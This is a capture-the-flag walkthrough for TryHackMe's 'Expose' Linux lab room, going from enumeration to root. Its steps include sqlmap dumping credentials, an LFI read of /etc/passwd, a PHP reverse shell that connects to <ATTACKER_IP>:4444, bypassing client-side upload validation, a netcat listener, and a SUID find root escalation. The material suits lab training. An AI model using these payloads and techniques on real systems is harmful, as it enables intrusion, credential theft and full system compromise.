# [Expose](https://tryhackme.com/room/expose)

## Use your red teaming knowledge to pwn a Linux machine.

This challenge is an initial test to evaluate your capabilities in red teaming skills.

_Exposing unnecessary services in a machine can be dangerous. Can you capture the flags and pwn the machine?_

### What is the user flag?

1. Perform a port scan to enumerate all open ports and running services on the target machine:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE                 VERSION
21/tcp   open  ftp                     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.141.47
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ff:03:2e:90:e7:ae:04:62:cf:ef:e2:83:f6:47:c1:8c (RSA)
|   256 ba:4f:4a:d6:a3:ea:a0:23:5e:37:b1:66:1c:19:9b:a3 (ECDSA)
|_  256 8a:40:85:1f:78:53:53:e9:82:02:b2:b7:10:1c:87:d0 (ED25519)
53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: EXPOSED
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     $SYS/broker/bytes/sent: 4
|     $SYS/broker/messages/received: 1
|     $SYS/broker/load/connections/5min: 0.20
|     $SYS/broker/load/sockets/1min: 0.91
|     $SYS/broker/load/bytes/sent/1min: 3.65
|     $SYS/broker/load/connections/1min: 0.91
|     $SYS/broker/load/messages/sent/1min: 0.91
|     $SYS/broker/uptime: 275 seconds
|     $SYS/broker/load/sockets/15min: 0.07
|     $SYS/broker/bytes/received: 18
|     $SYS/broker/load/bytes/received/5min: 3.53
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/load/bytes/received/1min: 16.45
|     $SYS/broker/load/messages/sent/5min: 0.20
|     $SYS/broker/load/messages/received/15min: 0.07
|     $SYS/broker/load/messages/received/5min: 0.20
|     $SYS/broker/load/bytes/sent/5min: 0.79
|     $SYS/broker/messages/sent: 1
|     $SYS/broker/load/messages/sent/15min: 0.07
|     $SYS/broker/load/sockets/5min: 0.20
|     $SYS/broker/store/messages/bytes: 179
|     $SYS/broker/load/connections/15min: 0.07
|     $SYS/broker/heap/maximum: 49688
|     $SYS/broker/load/bytes/received/15min: 1.19
|     $SYS/broker/load/messages/received/1min: 0.91
|_    $SYS/broker/load/bytes/sent/15min: 0.27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. The web application is served on the non-standard port 1337. Run a directory brute-force to discover hidden endpoints:

```bash
gobuster dir -u http://<TARGET_IP>:1337/ -w /usr/share/wordlists/dirb/big.txt -t 50
```

**Results:**

```
.htpasswd            (Status: 403) [Size: 280]
.htaccess            (Status: 403) [Size: 280]
admin                (Status: 301) [Size: 321] [--> http://<TARGET_IP>:1337/admin/]
admin_101            (Status: 301) [Size: 325] [--> http://<TARGET_IP>:1337/admin_101/]
javascript           (Status: 301) [Size: 326] [--> http://<TARGET_IP>:1337/javascript/]
phpmyadmin           (Status: 301) [Size: 326] [--> http://<TARGET_IP>:1337/phpmyadmin/]
server-status        (Status: 403) [Size: 280]
```

> Two login portals are exposed: `/admin/` and `/admin_101/`. The presence of `/phpmyadmin/` also confirms a MySQL database backend. The `/admin_101/` endpoint is the active one.

3. Navigate to `http://<TARGET_IP>:1337/admin_101/` and attempt a login with any credentials. Use Burp Suite to capture the resulting POST request. Save the raw HTTP request body to a file named `login` on your attacking machine.

4. Run sqlmap against the saved request to test for SQL injection and dump the entire database contents:

```bash
sqlmap -r login --dump
```

**Results:**

```
Database: expose
Table: config
[2 entries]
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
+----+------------------------------+-----------------------------------------------------+

Database: expose
Table: user
[1 entry]
+----+-----------------+---------------------+--------------------------------------+
| id | email           | created             | password                             |
+----+-----------------+---------------------+--------------------------------------+
| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
+----+-----------------+---------------------+--------------------------------------+
```

5. Navigate to h`ttp://<TARGET_IP>:1337/file1010111/index.php` and enter the password `easytohack` when prompted. Inspecting the HTML source reveals a hidden hint:

```html
<main class=" mx-auto py-8  min-h-[80vh] flex items-center justify-center gap-10 flex-col xl:flex-row">
 <p class="mb-4"><strong>Parameter Fuzzing is also important :)  or Can you hide DOM elements? <strong></p><span  style="display: none;">Hint: Try file or view as GET parameters?</span>
```

6. Exploit the LFI vulnerability by providing a path traversal sequence in the `file` GET parameter to read `passwd`: `http://<TARGET_IP>:1337/file1010111/index.php?file=../../../../etc/passwd`

**Results:**

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin bind:x:115:122::/var/cache/bind:/usr/sbin/nologin Debian-snmp:x:116:123::/var/lib/snmp:/bin/false redis:x:117:124::/var/lib/redis:/usr/sbin/nologin mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

7. Navigate to `http://<TARGET_IP>:1337/upload-cv00101011/index.php`. The page requires a name before granting access. Enter `zeamkish`, the username discovered via LFI to unlock the file upload form.

8. Create a PHP reverse shell file named `shell.php`. When executed by the web server, this script will open a TCP connection back to our machine and spawn an interactive shell over it:

```php
<?php
$ip = '<ATTACKER_IP>;
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

9. The upload form performs client-side validation that restricts uploads to image files. Because this check runs entirely in the browser, it can be bypassed without touching the server. Open the browser's developer tools, navigate to the Console tab, and override the validation function to always return true:

```js
window.validate = function () {
  return true;
};
```

10. Before triggering the uploaded shell, set up a Netcat listener on the attacking machine to catch the incoming reverse connection:

```bash
nc -lvnp 4444
```

11. Trigger the reverse shell by navigating to the uploaded file in your browser: `http://<TARGET_IP>:1337/upload-cv00101011/upload_thm_1001/shell.php`

12. The initial reverse shell is a limited, non-interactive shell. Upgrade it to a full pseudo-terminal for a stable interactive session:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo;fg;
```

13. Enumerate the `zeamkish` home directory. A plaintext credentials file is present:

```bash
cat /home/zeamkish/ssh_creds.txt
```

**Results:**

```
SSH CREDS
zeamkish
easytohack@123
```

14. Use the discovered credentials to establish a direct, stable SSH session:

```bash
ssh zeamkish@<TARGET_IP>
# Password: easytohack@123
```

15. Retrieve the user flag from `zeamkish's` home directory:

```bash
cat flag.txt
```

<img width="592" height="510" alt="SCREEN01" src="https://github.com/user-attachments/assets/dfcb60f6-a3e4-4a1c-bd5e-570a0122ef65" />

---

### What is the root flag?

1. Search the entire filesystem for binaries with the SUID bit set. SUID binaries execute with the file owner's effective privileges regardless of who runs them, making them prime privilege escalation targets:

```bash
find / -perm -u=s -type f 2>/dev/null
```

2. Exploit the SUID `find` binary to spawn a root shell. The `-exec` flag runs an arbitrary command for each match, and `-p` tells the spawned shell to preserve the elevated effective UID. The `-quit` flag stops find after the first match to avoid spawning multiple shells:

```bash
find . -exec /bin/sh -p \; -quit
whoami
cat /root/flag.txt
```

<img width="507" height="522" alt="SCREEN02" src="https://github.com/user-attachments/assets/db692b2c-5280-4263-8a80-2d617e3fbb28" />
